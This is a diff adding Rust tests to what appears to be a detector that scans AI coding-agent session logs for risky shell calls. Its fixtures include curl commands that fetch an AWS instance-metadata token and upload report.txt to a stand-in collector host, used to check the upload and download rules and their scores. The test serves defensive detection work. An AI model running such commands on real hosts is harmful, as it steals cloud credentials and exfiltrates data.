@@ -991,3 +991,212 @@ fn action_precision_cases_raise_only_the_expected_actions() {
     }
     assert_eq!(cases, 17);
 }
+
+/// One source file's bundled session rules, session score and native action
+/// rules.
+fn bundled_rules_for_source(
+    file: &str,
+    client: telltale_schema::clients::ClientId,
+    source_id: &str,
+    kind: telltale_schema::clients::SourceKind,
+    content: &str,
+) -> (Vec<String>, u64, Vec<String>) {
+    use telltale_core::{DetailedEvaluationOptions, Pipeline};
+    use telltale_detect::v2::{
+        compile_rule_v1,
+        session::{CanonicalSourceInput, evaluate_source},
+    };
+    use telltale_schema::{
+        observation::{CorrelationId, ObservedAt},
+        source::Source,
+    };
+    use telltale_sources::acquisition::{AcquisitionOptions, acquire_source};
+
+    let temp = tempfile::tempdir().unwrap();
+    let path = temp.path().join(file);
+    fs::write(&path, content).unwrap();
+    let source = Source {
+        client,
+        source_id: source_id.into(),
+        kind,
+        path,
+    };
+    let batch = acquire_source(
+        &source,
+        AcquisitionOptions::new(ObservedAt::new("2026-10-05T12:00:00Z").unwrap()),
+    )
+    .unwrap();
+    let rules = compile_rule_v1(
+        &telltale_rules::load_default_rule_set()
+            .unwrap()
+            .compatibility_export(),
+    )
+    .unwrap();
+    let instance = CorrelationId::source_reported("imds:synthetic").unwrap();
+    let evaluation = evaluate_source(
+        CanonicalSourceInput {
+            client: source.client,
+            source_id: &source.source_id,
+            source_instance: Some(&instance),
+            observations: &batch.observations,
+        },
+        &rules,
+        None,
+    )
+    .unwrap();
+    assert_eq!(evaluation.sessions().len(), 1, "{source_id}");
+    let session = &evaluation.sessions()[0];
+    let mut session_rules = session.rule_ids().to_vec();
+    session_rules.sort();
+    let scan = Pipeline::builder()
+        .build()
+        .unwrap()
+        .scan_sources_detailed(
+            std::slice::from_ref(&source),
+            &DetailedEvaluationOptions::default(),
+        )
+        .unwrap()
+        .remove(0);
+    let mut native = scan
+        .action_findings
+        .iter()
+        .flat_map(|action| action.rule_ids().iter().cloned())
+        .collect::<Vec<_>>();
+    native.sort();
+    (session_rules, session.rule_score(), native)
+}
+
+/// Sources store a shell call differently: Claude keeps only the decoded
+/// command, Codex rollouts and Copilot also keep the raw JSON as `arguments`,
+/// and a Codex argv call has only that raw JSON. None may change the verdict.
+#[test]
+fn imds_token_verdict_is_the_same_on_every_source_shape() {
+    use telltale_schema::clients::{ClientId, SourceKind};
+
+    const META: &str = "{\"timestamp\":\"2026-10-05T12:00:00.000Z\",\"type\":\"session_meta\",\"payload\":{\"id\":\"00000000-0000-4000-8000-000000000001\",\"timestamp\":\"2026-10-05T12:00:00.000Z\",\"cwd\":\"/synthetic/work\",\"originator\":\"codex_cli_rs\",\"cli_version\":\"0.1.0\"}}";
+    let ttl = "'X-aws-ec2-metadata-token-ttl-seconds: 60'";
+    let url = "http://169.254.169.254/latest/api/token";
+    let token = format!("TOKEN=$(curl -s -X PUT -H {ttl} {url})");
+    let auth = "\"X-aws-ec2-metadata-token: $TOKEN\"";
+    let region = "http://169.254.169.254/latest/meta-data/placement/region";
+    let collector = "https://collector.example.invalid/upload";
+    let codex = |name: &str, arguments: serde_json::Value| {
+        let call = serde_json::json!({"timestamp":"2026-10-05T12:00:00.000Z","type":"response_item","payload":{"type":"function_call","name":name,"arguments":arguments.to_string(),"call_id":"call-1"}});
+        format!("{META}\n{call}\n")
+    };
+
+    // (command, upload, download, score)
+    for (command, upload, download, score) in [
+        (format!("curl -s -X PUT -H {ttl} {url}"), false, false, 15),
+        (token.clone(), false, false, 15),
+        (
+            format!("{token}; curl -s -H {auth} {region}"),
+            false,
+            true,
+            35,
+        ),
+        (
+            format!("{token} && curl -s -H {auth} {region}"),
+            false,
+            true,
+            35,
+        ),
+        (
+            format!("curl -s -X PUT --data-binary @report.txt -H {ttl} {url}"),
+            true,
+            false,
+            75,
+        ),
+        (
+            format!("curl -s -X PUT -H {ttl} {url} {collector}"),
+            true,
+            false,
+            75,
+        ),
+        (
+            format!("{token}; curl -s --data-binary @report.txt {collector}"),
+            true,
+            false,
+            75,
+        ),
+    ] {
+        let claude = serde_json::json!({"type":"assistant","sessionId":"imds","timestamp":"2026-10-05T12:00:00Z","message":{"role":"assistant","model":"fixture-model","content":[{"type":"tool_use","id":"toolu_1","name":"Bash","input":{"command":command,"description":"Fetch a token"}}]}});
+        let copilot = serde_json::json!([{"arguments":serde_json::json!({"command":command,"description":"Fetch a token"}).to_string(),"call_id":"call-1","id":"c1","name":"bash","status":"completed","type":"function_call"}]);
+        for (label, file, client, source_id, kind, content, native_reads_it) in [
+            (
+                "claude",
+                "session.jsonl",
+                ClientId::Claude,
+                "claude.projects",
+                SourceKind::Jsonl,
+                format!("{claude}\n"),
+                true,
+            ),
+            (
+                "codex exec_command",
+                "rollout.jsonl",
+                ClientId::Codex,
+                "codex.sessions",
+                SourceKind::Jsonl,
+                codex(
+                    "exec_command",
+                    serde_json::json!({"cmd":command,"workdir":"/synthetic/work"}),
+                ),
+                true,
+            ),
+            // Native actions do not read through a `bash -lc` argv wrapper.
+            (
+                "codex shell argv",
+                "rollout.jsonl",
+                ClientId::Codex,
+                "codex.sessions",
+                SourceKind::Jsonl,
+                codex(
+                    "shell",
+                    serde_json::json!({"command":["bash","-lc",command]}),
+                ),
+                false,
+            ),
+            (
+                "copilot",
+                "process.log",
+                ClientId::Copilot,
+                "copilot.process_log",
+                SourceKind::CopilotProcessLog,
+                format!(
+                    "2026-10-05T12:00:00.000Z [INFO] Workspace initialized: imds-copilot (checkpoints: 0)\n2026-10-05T12:00:01.000Z [INFO] Accumulated output items (1): {copilot}\n"
+                ),
+                true,
+            ),
+        ] {
+            // An argv call has only the raw JSON, which `network.download` reads
+            // as one segment, so the upload text there still excludes the lookup.
+            let (download, score) = if label == "codex shell argv" && download {
+                (false, 15)
+            } else {
+                (download, score)
+            };
+            let (rules, got_score, native) =
+                bundled_rules_for_source(file, client, source_id, kind, &content);
+            let has = |list: &[String], rule: &str| list.iter().any(|id| id == rule);
+            assert_eq!(
+                has(&rules, "exfil.outbound_upload"),
+                upload,
+                "{label} upload: {command}"
+            );
+            assert_eq!(
+                has(&rules, "network.download"),
+                download,
+                "{label} download: {command}"
+            );
+            assert_eq!(got_score, score, "{label} score: {command}");
+            if native_reads_it {
+                assert_eq!(
+                    has(&native, "exfil.outbound_upload"),
+                    upload,
+                    "{label} native upload: {command}"
+                );
+            }
+        }
+    }
+}
